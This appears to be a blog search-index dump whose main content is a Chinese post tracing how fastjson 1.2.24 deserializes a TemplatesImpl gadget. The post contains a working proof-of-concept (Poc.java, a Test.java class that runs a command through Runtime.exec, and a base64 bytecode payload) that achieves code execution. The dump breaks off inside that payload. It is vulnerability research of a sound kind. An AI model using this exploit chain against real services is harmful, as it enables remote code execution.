df1e6a9096949944d8c8c5c332a6c41cd9fead91d4b3f0638f16a52edd29766a92a0c613539d8a8b329c0ea62891ebe29b125a94fef57b4573a406decb0fbb67507bd96f123e9b261ff3b69095217456cf3528e874cb514f819951c945a9e739824bd8fa7e3b89bdedd75ea6872a560ffd6079685aa976f5b4653dc9b63f0afeff50f768e58d0145e92f99d570b7a6800b3195218f8556b232f3781e16ea6edbf89a7c371b1b6e190aabed1627c8f56b05e5aa24a4866a563efac618b81dad77e0003dc09aa49d7f5e7e5e76494ee1eaee1741ba43338c94c7a1c5429ff09bbb1c147edba6011c53c32b6453a774ca9e53481d97b19c00273c7a2a852b0e568358800265e652c50cf3df37b1dc3d949c06219dbe6ec1e2c877161d87593f48d68893e2b929a0ac89b8b5f27665dc70bfef726225b1f7dc422332d3a750bdcd466c85f3471a13198803a0c9ef2328166d1fcbcc7832fe3b7e7ba4732466dcc363e6646748d230fcc88409c6e499f087a541235d70acc7b50a9055ab67f2a9849669d57c13d34eda387fa4e7b141bcbfab9e0711a4e1151e58c424207762cf5475210e97218b0a0dc30a8b5bf1a01f082b093768ab8acf02f8542f10cdf31c486555bf16edd66c91359ace2256adebed2293975079b7e5ad4362627283c3e3bfff1cf78aeb854be8110f0e3f75752242a69f0e4bc35f76e3ffbf06529fcb5fc26a83f4ca45363da699aac435a451c9a199e907843003d74749de3e1f82116b9b49e727667d10a5853a12054795b7df06e79adbf119e522b71048056e0f06782188926d8b643383a133fd05330f73d6acde9db3602a279f6137c3248eae5151659cd70698a3342311d87526666df4c513e93c0dfd3a0aa0177280a9235f8dc154c9cd0139412f3a87e3d9d691bbd6e94228a6e2997d17f0278a2bd5a45f524cbb4b6ddb3799d6e14fc508710556759e93104785505b1cdc9411635865d238e4a1aab2c2dc3e93ceae087dd5d81e362c576d5db80039c67c86ba47e7ab945562aaaea39627ae1e765c97046f9e21ccbed55ff06553048ecd666b351ca7474e57cee8d35bcac2c8f03c83bfcd0dd1ed19837ab140b60d488ac8fdd39a576626fc8db1abd2846da09e6f4f8adf9ae22b15f98e76d8c62ceb384753072fa22e964a1e2847dd8a1add015a16a501b023a07f23185dde5694cd55e8882084a47383bdf829197e797972674cdc69577352cc266bcefcd7dd9a810213fd5fd909963d8adae0b683d5762a51d738f9f37cb99677e29e8c361ec858062aa0938a4da702d7de9d9c9bdeafdb00073243f43d28d6d828f25eac5e2bc013fdd3e4590020f515916c9347629ac2d18aed1a0117b5a331ff2eb4e3449c0e20292e9e57c0bd2f95a1e3f6f2c1cde687625795d672987fd3a93665a562c6c45265ad52d47f7053fb7d6cc9657128312bb5ed7af34379cdaa061a298d8d158b0f08a6ab0d8b48c932997e384fd86ac09abb7048b92399de8756c9670d7680686fdbf0c7c4a8392393dd8b52206d2d50e1da88f2db6afd6c572a5ed045a8d789a368c02f5ab294b0b1fa8cc1eab327be667932b3af2feb40ecabdc48a3ea995a4ced1aae9843a10cfee3ca544ccce9aa726122e7d2ea5b4c32d379ae7aced4ff7986d68854298a0a584ed57758d5f4104086ca999e2d9d5df6fbf16d1c7c9c8931ea8f4ddd495b2c25df1d2a86e0230f81c6cfa4c567a4770cbf210d1e3ba679ad165e2f08d8b27fb54571d9ba8df625957c863e38396f915a521b2a257b226a5a80331ec9f78fed28175a8b7a66e1b0029f518919f7753db8f21042157f49c3d1d10e46cd1dadf11d2b5d3b2f2f2c6a36b330a86d85d33d27815aebd328e6be53543a95dc1bdc77c61f661fbf52692bad9c866f9a1e2989eb90902d104336fd452f72277a310f8b8868047098413d23fcc9cd2bc18aec360ef50daae10229cc837b786b03f44af3bfea438c49618d3d81040417fb8471214db3667232fa5d0daec28921a38e9e90bf8b688459b7e9c3be79f47d1a42cf6941e2e4c94be6daa28fe36f1a17a3ee8ba4c3ed4d28d2c23204ec2ac9fd6644e7cfb80e1c1d587200fe123c6939b6566a64b0fde0cb79f0ff94f5bcf272d6948bdfb134e6a4f8fbba91711f84ae467426e07dd7ef15d083bbaed28a633f623bfbb7802d688c4ec78f256fe7508e715bb9873454c3da4d4e04c42b6b5767f10cc520b8e2580cbbfb1ca9a10180b0f47d6f7581eba479f3fda551a62fd105f4e640833a9a1551170bfd3d2e96e2adcdc3deb689472580ac34d3903a6309210e350f54428388fb7d0e7df15e6cdec6d92b4c97f7e50f65b508c8e2d1fbbde5ffa19aff8248acf25fb81aaaf900b1632610d25d331bf7213979a66542b4dc6818711cf1b387986b0583c276fd31b178a2600ba5b5d97c67c85836d00e8f14b227cf700f74ed382618602f1750e60cc46c00df9743371cb14ec949582437944ffc44c52b656090a76d3765ce07644ef94d2e8ea14675102723ad5e3b78af9917c1eaddd2b0c8ef9e45be43fbef177638bcb8c1b720f535539d21b03aa57f0191d792a8595dd7167eb5b4ff2befbaf5477c43c4532327248f45a23ac166f02b1312f3315aedd536ab95b3af04212344c27c7b545df2cf1a4dc5c8a12d68a54e29ba0ee805ad495af601f0c76e4117eb40f5c9007bfe44ccce2644af6d955c60ea6ee97fb38340953d791710885de0f399f2a4d143178c3925a4c7910dd7e51eb3773eef1dc6589d26f643ea7498f990b39d9f139be7c7df291646f7956b328cfa4c8bbc8460354e1a675412b253112faaf5a334077e3fe2d2a66ca35921a76d69b9f84c2e9e1a770473d90f933b110893578cad10c039e7987f2c266993c155273e2d08e17202f889f4fbe0a52c2664be81d6ce7cd065639367f50d386e1f4d8ad9b416267a665dcebc3f8e6fcd1927224117d52816c5e2eeb86156e5e60e89c8d072b31a7469ab5c043d89aab127737e297ff5d509a48ef88c28027666dabcc74c1bb5fa714a4034b28200fa0f2438891486b55d3c370d428ce0c8e03359daf2817db36f4a199d88bc9d3aab46118ce6ef08d65dec39b325e484dfc92d2207decded4b3534b46966746a1e0980bb017d4bc4ff20f223b6b4d6b95c59ce980ccaa1ed603da5333ce6d3d8d685652ad21cd02d5628e70da43ef7cc563b07098d9b772fcb7ba663cb8068d85aa35b4483d63568556be47ce343ad9607b262e5d4b058a529eebbac64679edda7fb572c41c9e1eb4028f2bbea7e66297dc8ccd9d62fd7a63b0d5f459ccd4b5aacab31b06cdf7bc96d321b70ef88f6fcd877c803191310a4d10168cc34460ffdcd5a2384274bf89a54f871220372f165b29bc6fb5571445e7a49a4b2e2df4119697b1de6e896e4b242ee9cfc92fc6fcb1af3e164d087660056e1d8a284ea5d7388f123e847ebb0fc4f57bdab9b5e5d139ac0635c63e91280169d0813a0f9532660122d425dde1aa7dfc38efd95ab46c92066c4f4d1c85c977546f96d665c13546d3e2c5ebfd9b6ae97d4a73f6d075ffc3f8a9261369e940f9e69251c1bbc8efddb459ee6d900a8f16fd04ff6e48356b6e856e8cd28fc2c70efc3e72f6c7d79d2ea4b4f886a3684dd76e62f3865d4c92c790480cc0af42fb863b15b1acfd91ab81e1df963dd0efd3cffef9fc92e6dcad0fee8da41359f4699ce80794b992a4376c91b4bf1f065ee4537b9efdeea9a0f27fe7d75fe599d8a2f600deb172f22950bef0f6f5896c1dc71c16fbb65df6e6b8187791502a3de892d9383bb135c44a9321edbf8f41760a42bea752bb43d42f0eaf903906868583acc619827fb6be9c5d858eccf8478a27d8424ab564a8bef8f34ddbbbbfd5fa1b2981c2c8e848e69d65d3affd8faae37db800b9549da2f675386287a7b29f95b6a1571e92d4d6c25b0e15f66bfed09b6f02f9b0dc0716e6373154619f905594740aa7213ea0186b658d6cc1d6ff204c16958ad5c081ba5f6fdc2f0f26e2ee181d62c63f3068ee6f5cc4382e5cbc5722321fd4791faaf0be2f571bd1c1f1f560993c42add09bfbe7460a91b89dd15daff25720d487413779860fec79b1fa736b5c9c56b1ce158f9d4f5d8e331aaef22d612846377ad639110e1619a0172b66ef678a612e5ec0bcd82d3fb4443f6c56f45f13aa0110fe53d8bcce8f06a6c2c02dafd23f81a9c3233fa713d76406c2847e9eeb93a108392b43e813b9d124eb53dd0ae8779c775b72da68dd2b6bdfd32029805cd0b70c01b53e602758102b6241d3c83a14334be6277af1723ae0c857b00a7fc1cef229a0d78495b12ee533ff46b5fb099cee2c5de51d199f8f11ebc25471babbba60863b958f4c87c9584472d02534027cd88fcd5325bb789947990e921ae551d90f91bce902b855ff96cfd882500470bd7698a85b5dc128de61fda2686357e0f0c92622e351df768aaebc62a6279b8673d5fe68d7af0d48a1373b3fefcd816f33e3c61a41ac2da67ce217049f3270dd25c5fddad55dc3228f0ef17d433597e3b1c1981714def8d3144ecb0150fb73e12e63c4b459c9d3df930163b13a29bd673a9eeacfdb4184dea5a76864f71f50e0de6d5fb10576d74464589eeaa065971d8d126fc1965c11dfb57e1c4f2322fc97d4965d68cf2aca478576757aebf19fbc23f8c2cfcab4530a60a6f5e948cb4ae3fd49e2efde855146ea70a1848958a1899fac95662296fde2638106ac08fd00e0f211e27a989e9f904caaff3f01aff347d40a092925b58697a350d771ad1316abdfefb734218f688490daf28c81d643a4603ea0586f7fdfbd78b4cee408fc26bd80d75d9b10f86d0f3f576452c9185ce214f0d31564bbf02ead06b26b946d7ba01890d2437dc2215588311c9c4a25d476cb52b4e85d58a6e56b73feb3f65d354631165917a2f2b764dd8b0dc09cd46a525426607a1295474641d68d0026fe4b15a8c573a19deb34e9349a8e6736fce8cc8ad9bf5b97a610d5de17c97e8992c8166e14147fe8b0021744f5354281a5dc1a2a485ab54a549907de28d6e090a2fe382dc57fd067156c7897cc05725b69606749d2196a56ca007b18553960fc62e8637417e1b9c44a651fc43cc1eb504a8f244ee8e6651ab2c73d9553e061e5fc80ff7917bfba001a28918770fa8866a01d8df0abed598fafc73b52af8b1575c8aa473ffa221fe6ff7796e740c2b1ad4b374cf27a0c5d4391282c58670d3feb58f66077eba13de7a2ea9546c0ef39de45431fa0f013ee49bf2fcf43f044ef9cc5a03e3ff1342ccc96404ff4dfeb744e51db22093b977aad018e0051bd64035191f112195201110ce9083245b66725e7541f217e475548601ef7023d5fff22d3c7560dd2d2e6fe21b26d0d66b338fe8e7f0016e53dd3b6af53a2ab0c8c653a677bc80ca7cef25a0a197ae06e4f888f33f7f66f7277c0eed91e27900cf3d06507f4c3dbf0f69256fd6843a211da83509baa18595383381ea6502fb25b93682b9b6ccfd5522f5ac3dce26d94c8f1626be316ebae94499d1bd978366c71feb55e7802017c23f741a1cea6e57fafbe90ead811e000778936f722087906bfbc4a7c87e5aff44d5e3b13d51f1891744342f65c4336ec2fc084fd016b13ee0c8d6712e7d711e53af84b4193d29d13f94b28075b351db3bba8c0de21c431d09b1a3f17a5664f6bc442c8523d7443753ba551d113121f3fe12a3d11449c2f73f0cc909d1566c24f67acc46afc68ada0f32a8c29a47f10deaf8136f2434097c231276d2b8b4d20b5ee1b1689ffb013b1dcc8fe1ac6376ab35538d2f43723219e6b4763eabd716cb1f7dd023a9cfa7686ba4d34226dc0734f5679a0a94754b17a50558bbf91f0bce80d7c9cdbc66d8294a8486ad7d09c159e68b661acabe552b5030dc95bd08adf30419ddb02c19268b91220b44370fc06e1f7f984541eb7a7a7eed783bbc31faf1c6beedc5c957d6e51369307f598923b051bc1b4068d73aa481baf6134cfed1a5d3fd18736e08f9217407c60670952771d5fa9a3669975703178b71d03788334c05892647915ded45e7415105a0f131f432abdcccf35607d4b4b24efdb4f0463a83b73f50e70724f8e848b31f67c8b4695d5c7f06a6acc7059a161e27088e14a5535e25fc2ccac385ea445a77c0e5dd087d8da1cb27190a868299e7c165963b371d378680a4b42413781e16744e240273ac0e2d5ed0649fd7b272a960e0e7c890e861d599f4f9e513dc03b4c811eb688ea4596e2d282a0b1d12c5c8a6374d2d9460d507b8ce84554d3c1f07280f854d2603e385477b9d9d1e096546c6a16596971425af4ad9fd1094f6d07cd034c9cd0c112e88985335ad14298348a9b38042eb724a70061517ee58735aad1a9c21c7f6001fa1f6e84d942980bc6e0221dd41de8c0ae6a2fbbc85a2d9db510d579aa6461a1f822aa7427ac94453c0e5a68966416bda559ac4e0c95e53cc560617843c694f9b22184b50512560e1795f11b39f47fd7bd76ee24dbe238151a9d1b9ceacf5a616ab7e8d3e270cd52973d80fc7f62251d152f28299ebc19d4295737395b2ac7d880d7c7a629e5de69ab89337e4c4a02a5673298d979e417874380f7d33b9b2ae32baf7ff01e10b97cdc673c3e3cac3839fc4321e51787c946be4cff042e668a288815a3a673858b9e791daaa5aab2b822c139b744407d4a6383acfcf6498efaca9f8d8b059ac897607b66b4d065871f26562face2add3320a1b40747be8b4a6e44496400a5155e209a125fd33170bd5def8f959602647be6b7cb868e09ffdad317383ca8e95b9a30408e09d7bb93111cbe6931a541688cc4bf821647c2a38d17bb62818618d73c8acbd93666982bc5028ed2f6511c407c83967b1788e09b1586a2e5e5367195e318ac0c4f509ca170a9024a734cb92bcbb36fc0bedb9d818ab040e19fbd46d490e4cf34e425b528269375714e99e02fb7c6e49d10b1a251c580be98218a6614217474b09246558ef7ef42acbc5e5e84ed4212734249029a2778bfeb166b746b5147e9bbf4b3b2283c88220439388f87782457b10df0d82f1cbb426678a784a4f0bfba69f1f171b88a348c33ed2af3a13e106d412b874d2ef80bd80118ced7c1a7ecf228f41c0ed4880763190762e63465d5654268e50a19d5fc503365110e41a600a259d962cc21599d7ccce27d31fa62f7c42a85ba788f829dcd56bb89cb586a9243548ba60def426bce019e8fc2fd1c5c778c63c74fd02359c37ee483590ba9bf660aea1d0d82f9e12b12dbe4f3c84469d866482e4e7a731cf3a55599e3d010b92e1e67ae956a48a5875a25acd545aa4a1fc80e52604048f4edc36aa11fe23ed1977e2306798b5e4f2da7353553b545bfdaeb6fcf2a76a31e2ed3ea9b97d07208efe0a62bf2205608c00736d52eee733d82b4f5b7b01fe3c98a58d36a93ef0e7e63c41b452012365a523fd9f5ecac02097338b2320b062da8c561b8b37e832570b5fd4ab2066c1a9a338fb88317b7a6ce4e885b475b19cd3dc2d6a027e9767502977c4ba2ed439452d3c9c7c584b2e6a389101d80dbf576cbf537850f6ec6b1ad368550303f98f3d78c90ee2d9678caee3731099b9cdddfbdfed5e0be3d4b0581c2a0022667b831eb05982deb5dd8ca87dbdba12bcc21c4a03a38f2e578fcb9244f66ced978238861b4f54231d2969ecd7534d16739ab3cda00e7cc74d19294351a95678ba6531149bf267b70ae10948eb1c0e41ef1251148066c7c1ecb903c2477d13808cfeb3e9dc0947d9a296f4d41abddf3f07c871328b6ac55d8a09db67a52d4b4dbf6ed65260cd63dee0013dba19ee0fab7d8d46380f49d44543b629701f85869147ed298c7414e Hey, password is required here.","link":"/2024/09/14/eBPF%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"},{"title":"fastjson 反序列化流程硬核跟踪","text":"环境搭建 pom.xml 1234567891011121314151617181920212223242526272829&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.lisan&lt;/groupId&gt; &lt;artifactId&gt;learnfastjson&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-codec&lt;/groupId&gt; &lt;artifactId&gt;commons-codec&lt;/artifactId&gt; &lt;version&gt;1.10&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-io&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;2.3&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; Poc.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import org.apache.commons.io.IOUtils;import org.apache.commons.codec.binary.Base64;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.IOException;/** * Created by web on 2017/4/29. */public class Poc { public static String readClass(String cls){ ByteArrayOutputStream bos = new ByteArrayOutputStream(); try { IOUtils.copy(new FileInputStream(new File(cls)), bos); } catch (IOException e) { e.printStackTrace(); } return Base64.encodeBase64String(bos.toByteArray()); } public static void test_autoTypeDeny() throws Exception { ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(&quot;file.separator&quot;); final String evilClassPath = System.getProperty(&quot;user.dir&quot;) + &quot;/target/classes/Test.class&quot;; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;; String text1 = &quot;{\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS + &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+evilCode+&quot;\\&quot;],'_name':'a.b','_tfactory':{ },\\&quot;_outputProperties\\&quot;:{ },&quot; + &quot;\\&quot;_name\\&quot;:\\&quot;a\\&quot;,\\&quot;_version\\&quot;:\\&quot;1.0\\&quot;,\\&quot;allowedProtocols\\&quot;:\\&quot;all\\&quot;}\\n&quot;; System.out.println(text1); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //assertEquals(Model.class, obj.getClass()); } public static void main(String args[]){ try { test_autoTypeDeny(); } catch (Exception e) { e.printStackTrace(); } }} Test.java 12345678910111213141516171819202122232425import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app&quot;); } public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public static void main(String[] args) throws Exception { Test t = new Test(); }} 代码跟踪 TemplatesImpl.class的寻找 触发点，一定要传入Feature.SupportNonPublicField否则后面不会为非公有字段添加反序列化器（后面会再提到） 步入 com.alibaba.fastjson.JSON#parseObject:181 步入 com.alibaba.fastjson.JSON#parseObject:190 从全局来看整个反序列化将在下面parseObject进行，其大致顺序是 配置反序列化时启用的特性，比如是否允许反序列化非公有字段 获取一个json的词法分析对象parser 用parser分析传入进来的json字符串，进行反序列化。 /com/alibaba/fastjson/JSON.class:199 先来细看DefaultJSONParser创建过程，先执行类初始化方法（略）。 然后执行对象的构造方法。 /com/alibaba/fastjson/parser/DefaultJSONParser.class:98 执行构造方法的时候又会新建一个JSONScanner类，JSONScanner类的生成同样先是执行类初始化（略） 然后是对象父类的初始化 子类的初始化 /com/alibaba/fastjson/parser/JSONScanner.class:28 然后回到DefaultJSONParser中执行构造方法，需要特别说明是初始化的时候将因为传入的json是{开头，所以将token设置为了12，随着词法分析进行token进行会一直改变，token不一样意味着解析接下来json的策略也会变。token与字符的关联关系定义在com.alibaba.fastjson.parser.JSONToken com.alibaba.fastjson.parser.DefaultJSONParser#DefaultJSONParser 构造方法完成后意味着宏观来看的前两步也完成了，此时拿到词法分析器parser /com/alibaba/fastjson/JSON.class:203 接着进入从全局来看的最后一步（下面写的所有都是从最后一步展开分析）。调用parser的parseObject方法反序列化json。这里type是在写在Poc中的Object.class，这里的config是在Poc中new的ParserConfig，根据传入的类类型的不同，config会返回不同的反序列化器。 com.alibaba.fastjson.parser.DefaultJSONParser#parseObject:575 先检查传入的type是不是(泛型)数组类型，最后又回到DefaultJSONParser的parser com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.class#deserialze:42 parser方法根据token的不同case到不同分支里面，开始的时候提到了，在创建DefaultJSONParser的时候token设置为了12。 com.alibaba.fastjson.parser.DefaultJSONParser.class#parse:1295 case 12，主要进行的操作是提去出@type对应的类，并获取到类对象即TemplatesImpl。 com.alibaba.fastjson.parser.DefaultJSONParser#parseObject 这里将token设置为了16（意味着json合法情况下，下一个符号是逗号） 根据TemplatesImpl类对象，寻找针对TemplatesImpl的反序列化器，之所以要找新的反序列化器是为了后续反序列化TemplatesImpl的字段。 找TemplatesImpl.class对应的反序列化器的任务还是委托给config，但是显然config并没有专门对付TemplatesImpl的反序列化器，所以走到了最后一个if条件，即把TemplatesImpl当作一个Java Bean来看并待根据TemplatesImpl实际情况定制一个JavaBeanDeserializer。 com/alibaba/fastjson/parser/ParserConfig.class:411 定制一个的JavaBeanDeserializer来反序列化TemplatesImpl.class 细看一下TemplatesImpl版的JavaBeanDeserializer定制过程。 一来先构建一个beaninfo com.alibaba.fastjson.parser.ParserConfig.class#createJavaBeanDeserializer:480 beaninfo构建的目的主要是拿到TemplatesImpl满足条件的getter、setter对应的Field和无参构造方法。获取这些办法就是常规的内省操作。 内省重点是满足条件的getter和setter com.alibaba.fastjson.util.JavaBeanInfo.class#build:318 方法名长度大于4 &amp;&amp; 非静态函数 &amp;&amp; 返回类型为void或当前类 &amp;&amp; 参数个数为1个 &amp;&amp; 以set开头 com.alibaba.fastjson.util.JavaBeanInfo.class#build:458 方法名长度大于等于4 &amp;&amp; 非静态方法 &amp;&amp; 以get开头且第4个字母为大写 &amp;&amp; 无参数 &amp;&amp; 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong 找到getter setter对应的字段后，会把字段名、字段对应的方法、类对象等打包成fieldInfo并add到FieldList中 最后用内省拿到的各种东西去构建JavaBeanInfo com.alibaba.fastjson.util.JavaBeanInfo.class#build:480 构建JavaBeanInfo中有一步中的操作是把FiledInfo排序，排序之后后面要用到FileList的内容直接二分法拿。 com.alibaba.fastjson.util.JavaBeanInfo#JavaBeanInfo:70 JavaBeanInfo构建好会遍历其filedLIst查看是否有getOnly的方法，如果有的话后面就不会用asm的方法创建（对asm不了解，查网上资料是这么说的：获取java bean的属性值，需要调用反射，fastjson引入了asm的来避免反射导致的开销。）这里很不幸，getOutputProperties属于getOnly方法（至于为什么是getOnly简单跟踪一下FiledInfo创建过程就知道了，这里不再展开） 所以这里最后会用非asm的方法创建JavaBeanDeserializer，用人话说就是直接new JavaBeanDeserializer com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer JavaBeanDeserializer构造方法中又把刚才拿到beaninfo的操作重复了一遍（上面已经跟过了这里也不重复跟踪）。 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.class#JavaBeanDeserializer:50 JavaBeanDeserializer在构造方法中会为每一个Bean字段创建一个反序列化器，并把反序列化器放到sortedFieldDeserializers中 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.class#JavaBeanDeserializer:64 这个反序列化器默认情况下是DeafultFiledDeserializer com.alibaba.fastjson.parser.ParserConfig.class#createFieldDeserializer:565 最后会把JavaBeanDeserializer的Teamplaytesimpl方法到反序列化器的序列中（如果后面其它也要用就不用重新创建一次了） 至此JavaBeanDeserializer定制完成，下面就开始正式反序列化TemplatesImpl JavaBeanDeserializer.deserialze deserialze往下跟几步会进入label1064，从宏观来看主要的操作都在label1064和其子label中，做了以下这几件事情。 创建TemplatesImpl对象 继续读取json字符串内容 用字段的反序列化器把读到内容set到TemplatesImpl对象中 第一步创建TemplatesImpl对象 /com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class:579 第二步根据从json字符串读出的key，反序列化对应字段 /com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class:606 往下跟的话之前设置的Feature.SupportNonPublicField.mask在这里就发挥作用了，如果没有这个在TemplatesImpl这条链中_bytecodes因为是私有字段的原因最后就不会被反序列化。SupportNonPublicField选项会把所有字段的反序列化器全部生成并放到extraFieldDeserializers中。 com.alibaba.fastjson.parser.DefaultJSONParser:747 第三步到了最后的时刻，好戏上演。最后一步从局部宏观来看还可再细分为三步 1.获取直接和字段值打交道的反序列化器fieldValueDeserilizer 2.反序列化拿字段对象 3.把字段对象set到object中（如果字段对象的fieldInfo是getOnly，则会反射调用getter方法，从微观来讲RCE问题出在这个地方） 以_bytecodes为例 第一步 没啥好说的依旧通过config类获取对应的反序列化器 第二步 fieldValueDeserilizer是ObjectArrayCodec，负责把base64编码解码 第三步 就是把拿到的值放到TemplatesImpl对象中了 _name，_tfactory，_outputProperties的反序列化大同小异 说法在反序列化_outputProperties的时候 在第三步setValue的时候，因为_outputProperties是getOnly的所以进入不一样的分支，并触发它相应的get方法即getOutputProperties，最后会触发Test的无参数构造方法。 因为本文主要想描述fastjosn的大致流程，后面和反射部分和fastjson关联性不大了，就不细跟了。不过如果细跟的话就会发现为啥payload是这么构造。（json中看似多余字段为啥要加，为啥要继承AbstractTranslet等等，说白了就是如果不这样进入不了触发无参构造器的分支）。 杂想 弄懂整体流程，弄懂每个大流程下的小流程，弄懂流程之间参数的勾连关系。 从代码上来说，从功能来说。 从大流程上来说，从大流程中小流程来说。 套路或者说定性的规律 附 fastjson的黑名单 https://github.com/LeadroyaL/fastjson-blacklist token对应表 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** 1 关联到 error */public final static int ERROR = 1;/** 2 关联到 int */public final static int LITERAL_INT = 2;/** 3 关联到 float */public final static int LITERAL_FLOAT = 3;/** 4 关联到 string */public final static int LITERAL_STRING = 4;/** 5 关联到 iso8601 */public final static int LITERAL_ISO8601_DATE = 5;/** 6 关联到 true */public final static int TRUE = 6;/** 7 关联到 false */public final static int FALSE = 7;/** 8 关联到 null */public final static int NULL = 8;/** 9 关联到 new */public final static int NEW = 9;/** 10 关联到 ( */public final static int LPAREN = 10;/** 11 关联到 ) */public final static int RPAREN = 11;/** 12 关联到 { */public final static int LBRACE = 12;/** 13 关联到 } */public final static int RBRACE = 13;/** 14 关联到 [ */public final static int LBRACKET = 14;/** 15 关联到 ] */public final static int RBRACKET = 15;/** 16 关联到 , */public final static int COMMA = 16;/** 17 关联到 : */public final static int COLON = 17;/** 18 关联到 ident */public final static int IDENTIFIER = 18;/** 19 关联到 fieldName */public final static int FIELD_NAME = 19;/** 20 关联到 EOF */public final static int EOF = 20;/** 21 关联到 Set */public final static int SET = 21;/** 22 关联到 TreeSet */public final static int TREE_SET = 22;/** 23 关联到 undefined */public final static int UNDEFINED = 23; // undefined/** 24 关联到 ; */public final static int SEMI = 24;/** 25 关联到 . */public final static int DOT = 25;/** 26 关联到 hex */public final static int HEX = 26; payload 1{&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEAIW9wZW4gL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAMgAzAQAEVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAA